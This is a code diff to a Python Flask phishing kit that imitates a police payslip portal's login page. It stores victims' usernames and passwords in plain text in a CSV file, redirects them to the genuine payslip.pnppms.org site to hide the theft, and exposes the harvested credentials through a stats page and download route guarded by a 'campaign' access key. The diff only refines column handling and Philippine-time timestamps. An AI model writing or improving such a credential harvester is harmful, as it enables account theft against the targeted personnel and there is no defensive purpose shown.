@@ -27,7 +27,12 @@ def hash_filter(value):
 # Secret access key for stats page (change this to a secure value)
 STATS_ACCESS_KEY = "pnp-pms-campaign2025"
 
-# Route for rendering the identity page as the main landing page
+# Route for handling the root URL
+@app.route('/')
+def root():
+    return redirect('/Account/Login')
+
+# Route for rendering the login page
 @app.route('/Account/Login')
 def index():
     return render_template('index.html')
@@ -50,10 +55,8 @@ def login():
     
     # Save the complete data
     timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
-    firstname = "" # No longer collecting this separately
-    lastname = "" # No longer collecting this separately
     
-    save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
+    save_full_data("", "", username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
     
     # Redirect to external site
     return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2f")
@@ -264,6 +267,9 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
     script_dir = os.path.dirname(os.path.abspath(__file__))
     csv_path = os.path.join(script_dir, 'data.csv')
     
+    # Add PHT indicator to timestamp
+    timestamp_pht = timestamp + " PHT"
+    
     try:
         file_exists = os.path.isfile(csv_path)
         
@@ -273,8 +279,6 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
             # Write header if file does not exist or is empty
             if not file_exists or os.stat(csv_path).st_size == 0:
                 writer.writerow([
-                    'first_name',
-                    'last_name',
                     'username',
                     'password',
                     'timestamp'
@@ -283,11 +287,9 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
 
             # Write only essential data
             writer.writerow([
-                firstname,
-                lastname,
                 username,
                 password,
-                timestamp
+                timestamp_pht
             ])
             csvfile.flush()
             
@@ -302,8 +304,6 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
             
             if not os.path.exists(fallback_path) or os.stat(fallback_path).st_size == 0:
                 writer.writerow([
-                    'first_name',
-                    'last_name',
                     'username',
                     'password',
                     'timestamp'
@@ -312,11 +312,9 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
             
             # Write only essential data
             writer.writerow([
-                firstname,
-                lastname,
                 username,
                 password,
-                timestamp
+                timestamp_pht
             ])
             csvfile.flush()
             
@@ -381,10 +379,24 @@ def view_stats(access_key):
                     # Transform data to only include relevant fields
                     for row in reader:
                         entry = {}
-                        # Only include username, password, and timestamp
+                        # Get username from the correct column
                         entry['username'] = row.get('username', '')
+                        # Password is already stored, will be hashed in template
                         entry['password'] = row.get('password', '')
-                        entry['timestamp'] = row.get('timestamp', '')
+                        # Get timestamp and adjust for PHT (UTC+8)
+                        timestamp_str = row.get('timestamp', '')
+                        try:
+                            # Parse the timestamp
+                            timestamp_dt = datetime.strptime(timestamp_str, '%Y-%m-%d %H:%M:%S')
+                            # Add 8 hours for PHT (UTC+8)
+                            # Note: This assumes timestamps are stored in UTC
+                            # If timestamps are already in local time, this adjustment may not be needed
+                            pht_timestamp = timestamp_dt.strftime('%Y-%m-%d %H:%M:%S') + " PHT"
+                            entry['timestamp'] = pht_timestamp
+                        except Exception as e:
+                            # If there's an error parsing the timestamp, use the original
+                            entry['timestamp'] = timestamp_str
+                        
                         data.append(entry)
                 break  # Successfully read data, exit loop
             except Exception as e:
@@ -426,8 +438,8 @@ def download_csv(access_key):
     try:
         # Read the original data
         with open(csv_path, 'r') as csvfile:
-            reader = csv.reader(csvfile)
-            all_data = list(reader)
+            reader = csv.DictReader(csvfile)
+            rows = list(reader)
         
         # Create new file with only the required fields
         with open(temp_csv_path, 'w', newline='\n') as csvfile:
@@ -437,14 +449,22 @@ def download_csv(access_key):
             writer.writerow(['username', 'password', 'timestamp'])
             
             # Write data with only the required fields (keep password as plain text)
-            for row in all_data[1:]:  # Skip header
-                if len(row) >= 5:  # Make sure the row has enough columns
-                    username = row[2]  # username is at index 2
-                    password = row[3]  # password is at index 3
-                    timestamp = row[4]  # timestamp is at index 4
-                    
-                    # Include only the username, password (as plain text), and timestamp
-                    writer.writerow([username, password, timestamp])
+            for row in rows:
+                username = row.get('username', '')
+                password = row.get('password', '')  # Keep password as plain text for CSV
+                timestamp = row.get('timestamp', '')
+                
+                # Convert timestamp to PHT if needed
+                try:
+                    timestamp_dt = datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S')
+                    pht_timestamp = timestamp_dt.strftime('%Y-%m-%d %H:%M:%S') + " PHT"
+                    timestamp = pht_timestamp
+                except:
+                    # If parsing fails, use the original timestamp
+                    pass
+                
+                # Include only the username, password (as plain text), and timestamp
+                writer.writerow([username, password, timestamp])
         
         # Set the appropriate headers for CSV download
         filename = f"login_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
